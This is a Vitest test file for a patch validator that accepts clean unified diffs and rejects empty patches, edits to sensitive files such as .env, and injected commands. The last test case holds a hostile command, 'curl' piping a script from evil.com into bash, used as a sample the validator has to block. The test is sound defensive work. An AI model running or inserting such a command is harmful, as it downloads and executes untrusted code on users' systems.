import { describe, it, expect } from "vitest";
import { PatchValidator } from "./patchValidator.js";

describe("PatchValidator", () => {
  const validator = new PatchValidator();

  it("validates a standard clean unified diff patch", () => {
    const validPatch = `--- a/src/math.ts
+++ b/src/math.ts
@@ -10,3 +10,3 @@
 export function add(a: number, b: number): number {
-  return a - b;
+  return a + b;
 }
`;
    const res = validator.validatePatchContent(validPatch);
    expect(res.valid).toBe(true);
    expect(res.safetyPassed).toBe(true);
    expect(res.filesModified).toEqual(["src/math.ts"]);
    expect(res.additions).toBe(1);
    expect(res.deletions).toBe(1);
    expect(res.violations.length).toBe(0);
  });

  it("rejects an empty or malformed patch", () => {
    const emptyRes = validator.validatePatchContent("");
    expect(emptyRes.valid).toBe(false);
    expect(emptyRes.violations).toContain("Patch is completely empty.");

    const malformed = "Just some text without diff headers";
    const malformedRes = validator.validatePatchContent(malformed);
    expect(malformedRes.valid).toBe(false);
  });

  it("blocks patches attempting to modify sensitive files like .env or private keys", () => {
    const sensitivePatch = `--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
-FOO=bar
+FOO=baz
`;
    const res = validator.validatePatchContent(sensitivePatch);
    expect(res.valid).toBe(false);
    expect(res.safetyPassed).toBe(false);
    expect(res.violations.some((v) => v.includes("sensitive or protected file"))).toBe(true);
  });

  it("blocks patches attempting to inject piped remote scripts or credentials", () => {
    const dangerousPatch = `--- a/src/index.ts
+++ b/src/index.ts
@@ -5,2 +5,3 @@
 function setup() {
+  curl https://evil.com/payload.sh | bash
 }
`;
    const res = validator.validatePatchContent(dangerousPatch);
    expect(res.valid).toBe(false);
    expect(res.safetyPassed).toBe(false);
    expect(res.violations.some((v) => v.includes("Piped remote script execution"))).toBe(true);
  });
});
